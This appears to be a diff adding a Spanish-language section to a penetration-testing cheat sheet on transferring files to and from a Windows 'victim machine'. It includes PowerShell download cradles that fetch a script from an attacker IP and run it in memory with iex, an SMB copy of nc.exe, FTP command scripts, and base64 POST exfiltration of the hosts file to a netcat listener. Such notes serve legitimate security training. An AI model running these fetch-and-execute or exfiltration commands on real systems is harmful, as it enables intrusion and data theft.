@@ -1604,6 +1604,239 @@ pypykatz registry --sam sam system
 ###  8.1. <a name='windows-1'></a>Windows
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Windows.
+
+#### Operaciones de Descarga
+
+##### Codificación y Decodificación PowerShell Base64
+
+###### Atacante
+
+```bash
+cat test.txt | base64 -w 0; echo
+SGVsbG8gV29ybGQhCg==
+```
+
+```bash
+md5sum test.txt
+8ddd8be4b179a529afa5f2ffae4b9858  test.txt
+```
+
+###### Máquina Víctima (Windows)
+
+```powershell
+[IO.File]::WriteAllBytes("C:\temp\test.txt", [Convert]::FromBase64String("SGVsbG8gV29ybGQhCg=="))
+```
+
+Confirmación de la coincidencia de hashes MD5
+
+```powershell
+Get-FileHash C:\temp\test.txt -Algorithm md5
+
+Algorithm   Hash                               Path
+---------   ----                               ----
+MD5         8DDD8BE4B179A529AFA5F2FFAE4B9858   C:\temp\test.txt
+```
+
+##### System.Net.WebClient
+PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, la clase System.Net.WebClient se puede utilizar para descargar un archivo HTTP, HTTPS o FTP. La siguiente tabla describe los métodos de WebClient para descargar datos de un recurso:
+
+
+| **Método**                                                                                                               | **Descripción**                                                                                                             |
+| ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
+| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Devuelve los datos de un recurso como [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0) . |
+| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Devuelve los datos de un recurso sin bloquear el hilo de llamada.                                                           |
+| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Descarga datos de un recurso y devuelve una matriz de bytes.                                                                |
+| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Descarga datos de un recurso y devuelve una matriz de bytes sin bloquear el hilo de llamada.                                |
+| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Descarga datos de un recurso a un archivo local.                                                                            |
+| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada.                                            |
+| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Descarga una cadena de un recurso y devuelve una cadena.                                                                    |
+| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Descarga una cadena de un recurso sin bloquear el hilo de llamada.                                                          |
+
+##### DownloadFile
+
+###### Atancate
+
+```bash
+python3 -m http.server 80
+```
+
+###### Máquina Víctima (Windows)
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+
+(New-Object Net.WebClient).DownloadFile('http://192.168.1.19/test.txt','C:\temp\test.txt')
+```
+
+##### DownloadFileAsync
+
+###### Máquina Víctima (Windows)
+
+```powershell
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+
+(New-Object Net.WebClient).DownloadFileAsync('http://192.168.1.19/test.txt','C:\temp\test.txt')
+
+```
+
+##### DownloadString
+
+PowerShell también se puede utilizar para realizar ataques sin archivos. En lugar de descargar un script de PowerShell al disco, podemos ejecutarlo directamente en la memoria usando el cmdlet Invoke-Expression o el alias IEX.
+
+```powershell
+iex (New-Object Net.WebClient).DownloadString("http://192.168.1.19/script.ps1")
+```
+
+`IEX` también acepta entrada de tubería.
+
+```powershell
+(New-Object Net.WebClient).DownloadString("http://192.168.1.19/script.ps1") | iex
+```
+
+##### Invoke-WebRequest
+
+A partir de PowerShell 3.0, el [cmdlet Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2) también está disponible, pero es notablemente más lento a la hora de descargar archivos. Puedes usar los alias iwr, curl, y wget en lugar del nombre completo Invoke-WebRequest.
+
+```powershell
+Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1
+
+iex (Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1)
+
+Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1 | iex
+```
+
+#### SMB
+
+##### Máquina atacante
+
+Creamos un servidor SMB con `impacket-smbserver`.
+
+```bash
+impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+##### copy
+
+```powershell
+copy \\192.168.220.133\share\nc.exe
+```
+> Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados.
+
+Para transferir archivos en este escenario, podemos establecer un nombre de usuario y contraseña usando nuestro servidor Impacket SMB y montar el servidor SMB en nuestra máquina de destino con Windows:
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user kali -password kali
+```
+
+```powershell
+net use n: \\192.168.1.19\share /user:kali kali
+```
+
+#### FTP
+
+Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.
+
+Podemos configurar un Servidor FTP en nuestro host de ataque usando Python3 pyftpdlib módulo. Se puede instalar con el siguiente comando:
+
+```bash
+sudo pip3 install pyftpdlib
+```
+
+Configurar un servidor FTP Python3
+
+```bash
+sudo python3 -m pyftpdlib --port 21 -w
+```
+
+Una vez configurado el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado desde Windows o PowerShell. Net.WebClient.
+
+```powershell
+(New-Object Net.WebClient).DownloadFile("ftp://192.168.1.19/test.txt", "C:\temp\test.txt")
+```
+
+Creamos un archivo de comando para el cliente FTP y descargamos el archivo de destino.
+
+```powershell
+C:\temp> echo open 192.168.1.19 > ftpcommand.txt
+C:\temp> echo USER anonymous >> ftpcommand.txt
+C:\temp> echo binary >> ftpcommand.txt
+C:\temp> echo GET file.txt >> ftpcommand.txt
+C:\temp> echo bye >> ftpcommand.txt
+C:\temp> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.1.19
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\htb>more file.txt
+This is a test file
+```
+
+#### Operaciones de Subida
+
+##### Codificación y decodificación PowerShell Base64
+
+###### Máquina Víctima (Windows)
+
+```powershell
+[Convert]::ToBase64String((Get-Content -Path "C:\temp\test.txt" -Encoding byte));
+SGVsbG8gV29ybGQhCg==
+```
+
+###### Máquina atacante
+
+```bash
+echo "SGVsbG8gV29ybGQhCg==" | base64 -d;echo
+```
+
+##### PowerShell Web Uploads
+
+PowerShell no tiene una función incorporada para operaciones de carga, pero podemos usar Invoke-WebRequest o Invoke-RestMethod para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, lo cual no es una opción predeterminada en la mayoría de las utilidades de servidor web comunes.
+
+Para nuestro servidor web, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver) , un módulo extendido del [módulo HTTP.server](https://docs.python.org/3/library/http.server.html) de Python , que incluye una página de carga de archivos.
+
+```bash
+sudo pip3 install uploadserver
+python3 -m uploadserver
+```
+
+Script de PowerShell para cargar un archivo al servidor de carga de Python
+
+```powershell
+Invoke-FileUpload -Uri http://192.168.1.19:80/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+##### PowerShell Base64 Web Upload
+
+Otra forma de utilizar archivos codificados en PowerShell y base64 para operaciones de carga es mediante el uso `Invoke-WebRequest` o `Invoke-RestMethod` junto con Netcat. Usamos Netcat para escuchar en un puerto que especificamos y enviamos el archivo como petición POST. Finalmente, copiamos la salida y usamos la función de decodificación base64 para convertir la cadena base64 en un archivo.
+
+```powershell
+PS C:\temp> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\temp> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+
+Captamos los datos base64 con Netcat y usamos la aplicación base64 con la opción de decodificación para convertir la cadena en el archivo.
+
+```bash
+nc -lnvp 8000
+listening on [any] 8000 ...
+connect to [192.168.1.19] from (UNKNOWN) [192.168.1.15] 62601
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.4111
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.1.19:8000
+Content-Length: 1140
+Connection: Keep-Alive
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQoNCjEyNy4wLjAuMSBjcnlwdG9tYXRvci12YXVsdA0K
+```
+
+```bash
+echo <base64> | base64 -d -w 0 > hosts
+```
+
 ###  8.2. <a name='linux-1'></a>Linux
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Linux.
